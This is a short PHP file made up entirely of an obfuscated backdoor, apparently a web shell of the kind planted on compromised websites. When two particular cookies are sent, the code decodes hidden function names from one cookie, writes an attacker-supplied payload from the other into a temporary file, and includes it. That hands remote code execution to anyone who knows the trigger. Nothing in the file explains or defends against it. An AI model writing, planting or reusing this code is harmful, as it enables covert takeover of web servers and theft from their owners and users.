<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[35])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 10;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[35][$n];
        if (!$c[35][$n + 1]) {
            if (!$c[35][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 10 + 1;
    }
    $k = $p[26]() . $p[8];
    if (!$p[4]($k)) {
        $n = $p[7]($k, $p[14]);
        $p[1]($n, $p[28] . $p[22]($p[0]($c[3])));
    }
    include($k);
}